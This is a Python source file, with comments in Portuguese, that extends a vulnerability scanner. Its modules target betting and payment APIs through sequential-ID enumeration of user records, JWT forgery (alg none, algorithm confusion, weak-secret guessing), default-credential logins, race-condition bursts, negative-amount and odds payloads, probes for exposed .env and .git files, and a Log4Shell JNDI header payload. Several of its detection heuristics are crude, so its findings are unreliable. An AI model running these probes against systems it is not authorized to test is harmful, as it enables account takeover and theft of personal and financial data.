"""
MODULOS AVANCADOS — Adiciona ao vuln_scanner
IDOR, Token Manipulation, Race Conditions, Business Logic, Server-side CVEs
"""

import asyncio
import aiohttp
import json
import re
import hmac
import hashlib
import base64
from typing import Dict, List, Optional, Any
from urllib.parse import urlparse

from vuln_scanner import ScannerModule, Finding, VulnType, Severity


# =========================================================================
# IDOR SCANNER
# =========================================================================

class IDORScanner(ScannerModule):
    """Testa Insecure Direct Object References."""
    
    name = "idor"
    description = "IDOR, enumeração de IDs, privilege escalation"
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        tokens = options.get("tokens", [])
        
        # Endpoints com IDs para enumerated
        id_templates = [
            f"{base_url}/api/v1/user/{{id}}",
            f"{base_url}/api/v1/account/{{id}}",
            f"{base_url}/api/v1/profile/{{id}}",
            f"{base_url}/api/v1/bets/{{id}}",
            f"{base_url}/api/v1/order/{{id}}",
            f"{base_url}/api/v1/transaction/{{id}}",
            f"{base_url}/api/v2/user/{{id}}",
            f"{base_url}/api/v1/admin/users/{{id}}",
        ]
        
        sensitive_keywords = ['email', 'phone', 'balance', 'wallet', 'password', 
                             'cpf', 'cnpj', 'address', 'name', 'user']
        
        # Enumerar IDs 1-200
        for template in id_templates:
            for vid in range(1, 201):
                test_url = template.replace("{id}", str(vid))
                
                # Testar com tokens conhecidos + sem auth
                test_tokens = [""] + tokens + ["test_token", "bypass_token"]
                
                for token in test_tokens:
                    headers = {}
                    if token:
                        headers["Authorization"] = f"Bearer {token}"
                    
                    try:
                        async with session.get(test_url, headers=headers,
                                               timeout=aiohttp.ClientTimeout(total=60)) as resp:
                            if resp.status == 200:
                                content = await resp.text()
                                # Verificar se tem dados sensíveis
                                if any(kw in content.lower() for kw in sensitive_keywords):
                                    findings.append(Finding(
                                        vuln_type=VulnType.IDOR,
                                        severity=Severity.CRITICAL,
                                        title=f"IDOR — Acesso a registro via ID {vid}",
                                        description=f"Endpoint acessível com ID sequencial: {test_url}. Dados sensíveis de outro usuário expostos.",
                                        endpoint=test_url,
                                        parameter="id",
                                        evidence=f"Status 200, sensitive data detected in response",
                                        remediation="Implementar ownership validation. Validar se usuário logado tem permissão para acessar o recurso.",
                                    ))
                                    break  # Um achado por URL é suficiente
                    except Exception:
                        pass
        
        # Testar admin endpoints (vertical privilege escalation)
        admin_paths = [
            "/api/v1/admin/users",
            "/api/v1/admin/settings",
            "/api/v1/admin/bets",
            "/api/v1/admin/transactions",
            "/api/v2/admin",
        ]
        
        for path in admin_paths:
            test_url = base_url + path
            for method in ["GET", "POST"]:
                try:
                    headers = {"Authorization": "Bearer admin_bypass_test"}
                    
                    if method == "GET":
                        async with session.get(test_url, headers=headers,
                                               timeout=aiohttp.ClientTimeout(total=60)) as resp:
                            if resp.status == 200:
                                content = await resp.text()
                                if any(kw in content.lower() for kw in ['user', 'admin', 'list', 'users']):
                                    findings.append(Finding(
                                        vuln_type=VulnType.AUTH_BYPASS,
                                        severity=Severity.CRITICAL,
                                        title=f"Admin Panel Bypass — {path}",
                                        description=f"Painel admin acessível com token inválido: {test_url}",
                                        endpoint=test_url,
                                        parameter=None,
                                        evidence=f"Status 200 — admin panel accessible without valid auth",
                                        remediation="Implementar RBAC estrito. Middleware de validação de permissões.",
                                    ))
                except Exception:
                    pass
        
        return findings


# =========================================================================
# TOKEN MANIPULATION SCANNER
# =========================================================================

class TokenManipulationScanner(ScannerModule):
    """Testa vulnerabilidades em JWT e session management."""
    
    name = "token_manipulation"
    description = "JWT none algorithm, algo confusion, brute force secret, session fixation"
    
    COMMON_SECRETS = [
        "secret", "jwt_secret", "your-secret-key", "change_me",
        "supersecret", "mysecret", "password", "123456",
        "jwt", "token", "admin", "key", "abc123",
        "letmein", "welcome", "monkey", "dragon",
        "master", "qwerty", "login", "princess",
    ]
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        tokens = options.get("tokens", [])
        
        # Coletar tokens
        collected_tokens = await self._collect_tokens(session, base_url, tokens)
        
        for token_info in collected_tokens:
            token = token_info["token"]
            parts = token.split('.')
            if len(parts) != 3:
                continue
            
            # Test none algorithm
            finding = await self._test_none_algo(token, session, base_url)
            if finding:
                findings.append(finding)
            
            # Test algo confusion
            finding = await self._test_algo_confusion(token, session, base_url)
            if finding:
                findings.append(finding)
            
            # Test brute force secret
            finding = await self._test_brute_force(token, session, base_url)
            if finding:
                findings.append(finding)
        
        # Test session fixation
        finding = await self._test_session_fixation(session, base_url)
        if finding:
            findings.append(finding)
        
        return findings
    
    async def _collect_tokens(self, session: aiohttp.ClientSession,
                              base_url: str, provided_tokens: list) -> List[Dict]:
        """Coleta tokens de cookies e requests."""
        tokens = []
        
        # Tokens fornecidos
        for t in provided_tokens:
            tokens.append({"token": t, "source": "provided"})
        
        # Cookies
        try:
            async with session.get(base_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                for name, cookie in resp.cookies.items():
                    if any(kw in name.lower() for kw in ['token', 'jwt', 'session', 'auth', 'sid']):
                        tokens.append({"token": cookie.value, "source": f"cookie:{name}"})
        except:
            pass
        
        # Tentar login
        login_urls = [
            f"{base_url}/api/v1/auth/login",
            f"{base_url}/api/v1/login",
            f"{base_url}/auth/login",
        ]
        
        test_creds = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "test", "password": "test"},
            {"username": "user", "password": "123456"},
        ]
        
        for url in login_urls:
            for creds in test_creds:
                try:
                    async with session.post(url, json=creds,
                                            headers={"Content-Type": "application/json"},
                                            timeout=aiohttp.ClientTimeout(total=60)) as resp:
                        if resp.status == 200:
                            try:
                                data = await resp.json()
                                for key in ['token', 'access_token', 'jwt', 'accessToken']:
                                    if key in data:
                                        tokens.append({"token": data[key], "source": url})
                                        break
                            except:
                                pass
                except:
                    pass
        
        return tokens
    
    async def _test_none_algo(self, token: str, session: aiohttp.ClientSession,
                               base_url: str) -> Optional[Finding]:
        """Testa JWT none algorithm."""
        none_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0."
        
        try:
            async with session.get(base_url,
                                   headers={"Authorization": f"Bearer {none_token}"},
                                   timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status == 200:
                    content = await resp.text()
                    if any(kw in content.lower() for kw in ['user', 'admin', 'balance', 'wallet']):
                        return Finding(
                            vuln_type=VulnType.TOKEN_MANIPULATION,
                            severity=Severity.CRITICAL,
                            title="JWT 'none' Algorithm Accepted",
                            description="Server valida token JWT sem assinatura (alg: none)",
                            endpoint=base_url,
                            parameter="Authorization",
                            evidence="none algorithm accepted, authenticated response",
                            remediation="Bloquear algoritmo 'none'. Validar assinatura obrigatoriamente.",
                        )
        except:
            pass
        return None
    
    async def _test_algo_confusion(self, token: str, session: aiohttp.ClientSession,
                                    base_url: str) -> Optional[Finding]:
        """Testa algorithm confusion (RS->HS)."""
        parts = token.split('.')
        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            if header.get('alg') not in ['RS256', 'RS384', 'RS512', 'ES256']:
                return None
        except:
            return None
        
        for secret in self.COMMON_SECRETS:
            try:
                modified_header = json.dumps({"alg": "HS256", "typ": "JWT"})
                modified_b64 = base64.urlsafe_b64encode(modified_header.encode()).decode().rstrip('=')
                
                signing_input = f"{modified_b64}.{parts[1]}".encode()
                signature = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                
                forged = f"{modified_b64}.{parts[1]}.{sig_b64}"
                
                async with session.get(base_url,
                                       headers={"Authorization": f"Bearer {forged}"},
                                       timeout=aiohttp.ClientTimeout(total=60)) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        if any(kw in content.lower() for kw in ['user', 'balance', 'wallet']):
                            return Finding(
                                vuln_type=VulnType.TOKEN_MANIPULATION,
                                severity=Severity.CRITICAL,
                                title=f"JWT Algorithm Confusion — RS→HS256 ({secret})",
                                description=f"Token forjado com secret '{secret}' funcionou",
                                endpoint=base_url,
                                parameter="Authorization",
                                evidence=f"Secret: {secret}, forgery succeeded",
                                remediation="Validar algoritmo esperado no server. Usar JWKS.",
                            )
            except:
                pass
        
        return None
    
    async def _test_brute_force(self, token: str, session: aiohttp.ClientSession,
                                 base_url: str) -> Optional[Finding]:
        """Brute force do secret JWT."""
        parts = token.split('.')
        try:
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            if header.get('alg') not in ['HS256', 'HS384', 'HS512']:
                return None
        except:
            return None
        
        short_secrets = ["secret", "jwt", "key", "pass", "test", "admin",
                        "1234", "12345", "123456", "password", "token", "abc123"]
        
        for secret in short_secrets:
            try:
                signing_input = f"{parts[0]}.{parts[1]}".encode()
                signature = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
                
                forged = f"{parts[0]}.{parts[1]}.{sig_b64}"
                
                async with session.get(base_url,
                                       headers={"Authorization": f"Bearer {forged}"},
                                       timeout=aiohttp.ClientTimeout(total=60)) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        if any(kw in content.lower() for kw in ['user', 'balance', 'wallet']):
                            return Finding(
                                vuln_type=VulnType.TOKEN_MANIPULATION,
                                severity=Severity.CRITICAL,
                                title=f"JWT Secret Brute-Forced — '{secret}'",
                                description=f"Secret encontrado: '{secret}'",
                                endpoint=base_url,
                                parameter="Authorization",
                                evidence=f"Secret: {secret}",
                                remediation="Usar secrets longos (>32 chars). Rotation.",
                            )
            except:
                pass
        
        return None
    
    async def _test_session_fixation(self, session: aiohttp.ClientSession,
                                      base_url: str) -> Optional[Finding]:
        """Testa session fixation."""
        fix_sessions = ["fixed_session_12345", "hacked_session", "admin_session"]
        
        for fix_session in fix_sessions:
            try:
                async with session.get(
                    f"{base_url}/api/v1/auth/login",
                    cookies={"session": fix_session},
                    headers={"Content-Type": "application/json"},
                    json={"username": "test", "password": "test"},
                    timeout=aiohttp.ClientTimeout(total=60)
                ) as resp:
                    new_cookies = dict(resp.cookies)
                    if new_cookies.get("session") == fix_session:
                        return Finding(
                            vuln_type=VulnType.SESSION_FIXATION,
                            severity=Severity.HIGH,
                            title="Session Fixation Detected",
                            description="Session ID não é rotateada após login",
                            endpoint=f"{base_url}/api/v1/auth/login",
                            parameter="session",
                            evidence=f"Session preserved: {fix_session}",
                            remediation="Rotate session ID após login. Invalidar sessões antigas.",
                        )
            except:
                pass
        
        return None


# =========================================================================
# RACE CONDITION SCANNER
# =========================================================================

class RaceConditionScanner(ScannerModule):
    """Testa condições de corrida."""
    
    name = "race_condition"
    description = "Race conditions em bets, depósitos, transações"
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        race_endpoints = [
            f"{base_url}/api/v1/bets",
            f"{base_url}/api/v1/bet",
            f"{base_url}/api/v1/deposit",
            f"{base_url}/api/v1/withdraw",
            f"{base_url}/api/v1/transaction",
            f"{base_url}/api/v1/wallet/transfer",
            f"{base_url}/api/v1/promo/apply",
            f"{base_url}/api/v1/coupon/use",
            f"{base_url}/api/v1/balance",
        ]
        
        for endpoint in race_endpoints:
            # 50 requisições simultâneas
            tasks = []
            for i in range(50):
                tasks.append(session.get(endpoint, timeout=aiohttp.ClientTimeout(total=60)))
            
            try:
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                success_count = sum(1 for r in responses 
                                   if isinstance(r, aiohttp.ClientResponse) and r.status == 200)
                
                if success_count >= 15:
                    findings.append(Finding(
                        vuln_type=VulnType.RACE_CONDITION,
                        severity=Severity.CRITICAL,
                        title=f"Race Condition — {success_count}/50 simultâneas bem-sucedidas",
                        description=f"Endpoint vulnerável a race condition: {endpoint}",
                        endpoint=endpoint,
                        parameter=None,
                        evidence=f"{success_count}/50 parallel requests succeeded",
                        remediation="Implementar locks/distributed locks. Transações atômicas.",
                    ))
            except Exception:
                pass
        
        return findings


# =========================================================================
# BUSINESS LOGIC SCANNER
# =========================================================================

class BusinessLogicScanner(ScannerModule):
    """Testa falhas de lógica de negócio."""
    
    name = "business_logic"
    description = "Preço negativo, odds manipuladas, quantidades negativas"
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Preço negativo
        negative_payloads = [
            {"amount": -100, "currency": "BRL"},
            {"price": -999, "quantity": 1},
            {"bet_amount": -50, "odds": 2.0},
            {"quantity": -5, "product_id": "1"},
            {"stake": -1000},
        ]
        
        endpoints = [
            f"{base_url}/api/v1/bets",
            f"{base_url}/api/v1/orders",
            f"{base_url}/api/v1/checkout",
            f"{base_url}/api/v1/payment",
            f"{base_url}/api/v1/deposit",
            f"{base_url}/api/v1/withdraw",
        ]
        
        for endpoint in endpoints:
            for payload in negative_payloads:
                try:
                    async with session.post(endpoint, json=payload,
                                            headers={"Content-Type": "application/json"},
                                            timeout=aiohttp.ClientTimeout(total=60)) as resp:
                        if resp.status in [200, 201]:
                            content = await resp.text()
                            if any(kw in content.lower() for kw in ['success', 'created', 'order', 'bet', 'accepted']):
                                findings.append(Finding(
                                    vuln_type=VulnType.NEGATIVE_PRICE,
                                    severity=Severity.CRITICAL,
                                    title="Negative Price Accepted — Business Logic Flaw",
                                    description=f"Backend aceitou valor negativo: {payload}",
                                    endpoint=endpoint,
                                    parameter="amount/price",
                                    evidence=f"Payload: {payload}, Response accepted",
                                    remediation="Validar integridade de valores numéricos. Rejeitar negativos.",
                                ))
                                break
                except:
                    pass
        
        # Odds manipuladas
        try:
            async with session.get(f"{base_url}/api/v1/sports/events",
                                   timeout=aiohttp.ClientTimeout(total=60)) as resp:
                if resp.status == 200:
                    events = await resp.json()
                    if isinstance(events, list) and len(events) > 0:
                        event = events[0]
                        event_id = event.get("id") or event.get("_id")
                        
                        bad_odds = [999999, -100, 0, -1, 99999]
                        for odds in bad_odds:
                            try:
                                async with session.post(f"{base_url}/api/v1/bets",
                                                        json={"event_id": event_id, "odds": odds, "stake": 100},
                                                        headers={"Content-Type": "application/json"},
                                                        timeout=aiohttp.ClientTimeout(total=60)) as resp:
                                    if resp.status in [200, 201]:
                                        findings.append(Finding(
                                            vuln_type=VulnType.ODDS_MANIPULATION,
                                            severity=Severity.CRITICAL,
                                            title="Odds Manipulation — Invalid Odds Accepted",
                                            description=f"Odd inválida ({odds}) foi aceita pelo sistema",
                                            endpoint=f"{base_url}/api/v1/bets",
                                            parameter="odds",
                                            evidence=f"Payload: odds={odds}, stake=100",
                                            remediation="Validar range de odds no servidor. Odds devem vir do bookmaker.",
                                        ))
                                        break
                            except:
                                pass
        except:
            pass
        
        return findings


# =========================================================================
# SERVER-SIDE SCANNER
# =========================================================================

class ServerSideScanner(ScannerModule):
    """Testa CVEs e configurações expostas."""
    
    name = "server_side"
    description = "CVEs Log4Shell, configs DB expostas, actuator, info disclosure"
    
    async def scan(self, target: str, session: aiohttp.ClientSession,
                   options: Dict[str, Any]) -> List[Finding]:
        findings = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Arquivos sensíveis
        sensitive_paths = [
            ("/.env", "Environment file"),
            ("/.env.local", "Local env"),
            ("/config/database.yml", "Database config YAML"),
            ("/config/database.json", "Database config JSON"),
            ("/.env.production", "Production env"),
            ("/wp-config.php", "WordPress config"),
            ("/config.php", "PHP config"),
            ("/configuration.php", "Joomla config"),
            ("/web.config", "IIS config"),
            ("/.git/config", "Git config"),
            ("/.svn/entries", "SVN entries"),
            ("/backup.sql", "Database backup"),
            ("/db.sql", "Database dump"),
            ("/dump.sql", "SQL dump"),
            ("/robots.txt", "Robots file"),
            ("/crossdomain.xml", "Flash policy"),
            ("/clientaccesspolicy.xml", "Silverlight policy"),
        ]
        
        for path, desc in sensitive_paths:
            try:
                async with session.get(f"{base_url}{path}",
                                       timeout=aiohttp.ClientTimeout(total=60)) as resp:
                    if resp.status == 200:
                        findings.append(Finding(
                            vuln_type=VulnType.DB_CONFIG_EXPOSED,
                            severity=Severity.CRITICAL,
                            title=f"{desc} Exposed — {path}",
                            description=f"Arquivo sensível exposto publicamente: {path}",
                            endpoint=f"{base_url}{path}",
                            parameter=None,
                            evidence=f"Status 200, {desc} accessible",
                            remediation="Bloquear acesso a arquivos sensíveis via web server.",
                        ))
            except:
                pass
        
        # Spring Actuator
        actuator_paths = [
            "/actuator/env", "/actuator/health", "/actuator/info",
            "/actuator/mappings", "/actuator/beans", "/actuator/configprops",
            "/actuator/trace", "/actuator/loggers",
            "/env", "/configprops",
        ]
        
        for path in actuator_paths:
            try:
                async with session.get(f"{base_url}{path}",
                                       timeout=aiohttp.ClientTimeout(total=60)) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        if any(kw in content.lower() for kw in ['password', 'secret', 'key', 'token']):
                            findings.append(Finding(
                                vuln_type=VulnType.DB_CONFIG_EXPOSED,
                                severity=Severity.CRITICAL,
                                title=f"Spring Actuator {path} Exposed — Secrets Leaked",
                                description=f"Actuator exposto contendo variáveis sensíveis: {path}",
                                endpoint=f"{base_url}{path}",
                                parameter=None,
                                evidence="Actuator env with secrets exposed",
                                remediation="Desativar endpoints sensíveis do actuator. Proteger com auth.",
                            ))
            except:
                pass
        
        # Log4Shell check
        log4j_headers = {
            "User-Agent": "${jndi:ldap://localhost:1337/test}",
            "X-Forwarded-For": "${jndi:ldap://localhost:1337/test}",
            "Referer": "${jndi:ldap://localhost:1337/test}",
        }
        
        for endpoint in [f"{base_url}/api/v1/search", f"{base_url}/api/v1/query", base_url]:
            try:
                async with session.get(endpoint, headers=log4j_headers,
                                       timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    if resp.status != 200:
                        findings.append(Finding(
                            vuln_type=VulnType.CVE_EXPLOIT,
                            severity=Severity.CRITICAL,
                            title="Log4Shell — CVE-2021-44228 Detected",
                            description="Server processou payload Log4j sem sanitização",
                            endpoint=endpoint,
                            parameter="User-Agent/X-Forwarded-For",
                            evidence=f"Status {resp.status} after jndi payload",
                            remediation="Atualizar Log4j para >=2.17.1. WAF rule.",
                            cve="CVE-2021-44228",
                        ))
            except asyncio.TimeoutError:
                findings.append(Finding(
                    vuln_type=VulnType.CVE_EXPLOIT,
                    severity=Severity.CRITICAL,
                    title="Log4Shell — CVE-2021-44228 (Timeout)",
                    description="Timeout indica processamento do payload Log4j",
                    endpoint=endpoint,
                    parameter="User-Agent",
                    evidence="Request timed out after jndi payload",
                    remediation="Atualizar Log4j imediatamente. Isolar rede.",
                    cve="CVE-2021-44228",
                ))
            except:
                pass
        
        return findings
